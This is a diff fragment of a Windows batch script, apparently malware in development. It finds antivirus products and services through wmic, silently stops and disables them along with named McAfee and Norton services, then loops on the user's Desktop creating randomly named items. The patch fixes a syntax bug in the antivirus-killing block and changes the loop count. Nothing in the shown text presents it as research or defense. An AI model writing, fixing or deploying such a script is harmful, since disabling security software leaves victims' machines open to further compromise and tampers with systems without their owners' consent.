@@ -42,7 +42,8 @@ for /F "tokens=*" %%a in ('wmic product where "name like '%%Antivirus%%' or name
 for /F "tokens=*" %%b in ('wmic service where "name like '%%Antivirus%%' or name like '%%Anti-Virus%%' or displayname like '%%Antivirus%%' or displayname like '%%Anti-Virus%%'" get name 2^>nul') do (
     sc stop "%%b" >nul 2>&1
     sc config "%%b" start= disabled >nul 2>&1
-)net stop "McShield" >nul 2>&1
+)
+net stop "McShield" >nul 2>&1
 sc config "McShield" start= disabled >nul 2>&1
 net stop "ccSvcHst" >nul 2>&1
 sc config "ccSvcHst" start= disabled >nul 2>&1
@@ -72,8 +73,7 @@ cd %userprofile%\Desktop
 
 setlocal EnableDelayedExpansion
 
-for /L %%i in (1,1,50) do ( 
-    echo Iteration %%i
+for /L %%i in (1,1,26) do ( 
     timeout /t 1 /nobreak >nul
     set "random_name="
     for /L %%j in (1,1,8) do (
